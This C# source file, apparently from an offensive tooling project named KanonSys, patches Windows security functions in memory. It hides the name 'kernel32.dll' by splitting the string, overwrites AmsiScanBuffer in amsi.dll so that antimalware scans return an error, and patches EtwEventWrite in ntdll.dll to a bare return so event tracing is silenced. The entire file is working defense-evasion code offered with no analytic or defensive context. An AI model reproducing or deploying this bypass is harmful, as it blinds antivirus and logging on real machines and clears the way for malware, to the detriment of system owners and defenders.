using System;
using System.Runtime.InteropServices;


namespace KanonSys.Patch
{
    public class Patch
    {
        [DllImport("ker"+"nel"+"32"+".d"+"ll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("ker" + "nel" + "32" + ".d" + "ll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("ker" + "nel" + "32" + ".d" + "ll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static bool StartPatchBuffer()
        {
#if NET_4 
            byte[] patch;
            if (IntPtr.Size == 8)
            {
                patch = new byte[6];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc3;
            }
            else
            {
                patch = new byte[8];
                patch[0] = 0xB8;
                patch[1] = 0x57;
                patch[2] = 0x00;
                patch[3] = 0x07;
                patch[4] = 0x80;
                patch[5] = 0xc2;
                patch[6] = 0x18;
                patch[7] = 0x00;
            }
#endif
            byte[] nPatch;
            if (IntPtr.Size == 8)
            {
                nPatch = new byte[] { 0xc3, 0x00 };
            }
            else
            {
                nPatch = new byte[] { 0xc2, 0x14, 0x00 };
            }

            try
            {
#if NET_4
                var library = LoadLibrary("amsi.dll");
                var address = GetProcAddress(library, "AmsiScanBuffer");
                uint oldProtect;
                VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, address, patch.Length);
                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
#endif
                
                
                uint nOldProtect;
                 //https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
                var ntdll = LoadLibrary("ntdll.dll");
                var etwEventSend = GetProcAddress(ntdll, "EtwEventWrite");
                VirtualProtect(etwEventSend, (UIntPtr)nPatch.Length, 0x40, out nOldProtect);
                Marshal.Copy(nPatch, 0, etwEventSend, nPatch.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}